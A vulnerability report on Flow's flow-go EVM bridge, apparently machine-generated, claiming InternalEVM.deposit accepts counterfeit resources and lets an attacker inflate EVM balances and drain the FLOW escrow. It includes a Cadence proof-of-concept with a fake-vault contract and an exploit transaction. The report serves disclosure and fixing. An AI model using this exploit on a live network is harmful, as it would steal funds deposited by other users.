### Title
`InternalEVM.deposit` Accepts `AnyResource` Without Token-Type Validation, Enabling EVM Escrow Inflation — (`fvm/evm/stdlib/contract.go`, `fvm/evm/impl/impl.go`)

---

### Summary

The `InternalEVM.deposit` native function, which backs the Cadence-to-EVM FLOW token bridge, declares its `from` parameter as `AnyResource` rather than `@FlowToken.Vault`. The Go implementation reads only the `balance` field of whatever resource is supplied and unconditionally creates a `FLOWTokenVault` from that value. An unprivileged transaction author can deploy a counterfeit Cadence resource with an arbitrary `balance: UFix64` field, call `InternalEVM.deposit` directly (bypassing the type-safe wrappers in `EVM.cdc`), and inflate an EVM account's balance without depositing any real FLOW tokens. The attacker then withdraws real FLOW tokens from the EVM escrow vault, draining funds deposited by other users.

---

The Cadence-level wrappers (`EVMAddress.deposit` and `CadenceOwnedAccount.deposit`) both declare `from: @FlowToken.Vault`, enforcing the correct type at those call sites: [3](#0-2) [4](#0-3) 

However, `InternalEVM` is a predeclared value injected into the Cadence environment by the FVM and is accessible from any Cadence code, including user transactions. Because the native function's Sema type is `AnyResource`, the Cadence type checker permits any resource to be passed when `InternalEVM.deposit` is called directly, completely bypassing the `@FlowToken.Vault` constraint enforced by the higher-level wrappers.

---

### Impact Explanation

An attacker who calls `InternalEVM.deposit` directly with a counterfeit resource inflates their EVM account balance without depositing any real FLOW tokens into the EVM escrow. The EVM state records the inflated balance. The attacker then calls `CadenceOwnedAccount.withdraw` (or `EVMAddress`-level withdrawal) to redeem real FLOW tokens from the shared EVM escrow vault — tokens that were deposited by honest users. This is a direct cross-VM asset loss: the EVM escrow becomes insolvent, and legitimate users cannot withdraw their funds.

The comment in the implementation itself acknowledges the escrow invariant that is broken:

> "Destroying would incorrectly be equivalent to a burn and decrease the total supply, and a withdrawal would then have to perform an actual mint of new tokens." [5](#0-4) 

When a fake resource is passed, the escrow receives no real tokens, yet the EVM state is credited — exactly the insolvency scenario described in the reference report.

---

### Likelihood Explanation

- `InternalEVM` is a predeclared value accessible from any Cadence transaction or script; no special privilege is required.
- Deploying a Cadence contract with a resource that has a `balance: UFix64` field is trivial and permissionless on Flow.
- The attacker needs only to know the `InternalEVM.deposit` function name and signature, both of which are public in the open-source `flow-go` repository.
- No staked node, admin key, or quorum compromise is required.

---

### Recommendation

Change the `from` parameter type in `InternalEVMTypeDepositFunctionType` from `sema.AnyResourceType` to the concrete `@FlowToken.Vault` Sema type. Additionally, add an explicit runtime type assertion in `newInternalEVMTypeDepositFunction` to verify that the supplied `CompositeValue`'s static type matches the `FlowToken.Vault` composite type before reading its `balance` field and crediting the EVM account.

---

### Proof of Concept

```cadence
// Step 1: Deploy a malicious contract with a fake "vault"
access(all) contract FakeVault {
    access(all) resource Fake {
        access(all) var balance: UFix64
        init(b: UFix64) { self.balance = b }
    }
    access(all) fun create(b: UFix64): @Fake {
        return <- create Fake(b: b)
    }
}

// Step 2: In a separate transaction, inflate EVM balance
transaction {
    prepare(signer: auth(BorrowValue) &Account) {
        // Create a fake resource claiming 1,000,000 FLOW
        let fake <- FakeVault.create(b: 1_000_000.0)

        // Call InternalEVM.deposit directly — bypasses @FlowToken.Vault check
        // InternalEVM is a predeclared value; no import needed
        InternalEVM.deposit(
            from: <-fake,
            to: [/* attacker's EVM address bytes */]
        )
        // Attacker's EVM balance is now 1,000,000 FLOW with zero real tokens deposited
    }
}

// Step 3: Withdraw real FLOW from the EVM escrow
// coa.withdraw(balance: EVM.Balance(attoflow: <1_000_000 FLOW in attoflow>))
// → drains real FLOW deposited by other users
```

func newInternalEVMTypeDepositFunction(
	gauge common.MemoryGauge,
	handler types.ContractHandler,
) *interpreter.HostFunctionValue {
	return interpreter.NewStaticHostFunctionValue(
		gauge,
		stdlib.InternalEVMTypeDepositFunctionType,
		func(invocation interpreter.Invocation) interpreter.Value {
			context := invocation.InvocationContext

			// Get from vault

			fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amountValue, ok := fromValue.GetField(
				context,
				fungibleTokenVaultTypeBalanceFieldName,
			).(interpreter.UFix64Value)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))

			// Get to address

			toAddressValue, ok := invocation.Arguments[1].(*interpreter.ArrayValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			toAddress, err := AddressBytesArrayValueToEVMAddress(context, toAddressValue)
			if err != nil {
				panic(err)
			}

			// NOTE: We're intentionally not destroying the vault here,
			// because the value of it is supposed to be "kept alive".
			// Destroying would incorrectly be equivalent to a burn and decrease the total supply,
			// and a withdrawal would then have to perform an actual mint of new tokens.

			// Deposit

			const isAuthorized = false
			account := handler.AccountByAddress(toAddress, isAuthorized)
			account.Deposit(types.NewFlowTokenVault(amount))

			return interpreter.Void
		},
	)
